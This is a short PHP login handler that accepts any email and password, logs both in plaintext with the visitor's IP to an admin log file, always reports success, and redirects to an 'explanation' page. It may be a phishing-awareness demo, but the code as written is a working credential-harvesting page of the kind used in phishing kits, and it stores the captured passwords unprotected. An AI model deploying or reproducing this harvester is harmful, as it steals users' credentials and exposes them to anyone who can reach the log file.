<?php
session_start();

$email = $_POST['email'];
$password = $_POST['password'];

// Log login attempt
$log_entry = date('Y-m-d H:i:s') . " | LOGIN | Email: $email | Password: $password | IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
file_put_contents('admin/logs/logins.txt', $log_entry, FILE_APPEND);

// Fake verification (always works)
$_SESSION['email'] = $email;
$_SESSION['logged_in'] = true;
$_SESSION['balance'] = 10.00;

// Redirect to explanation
header('Location: explanation.html');
exit();
?>
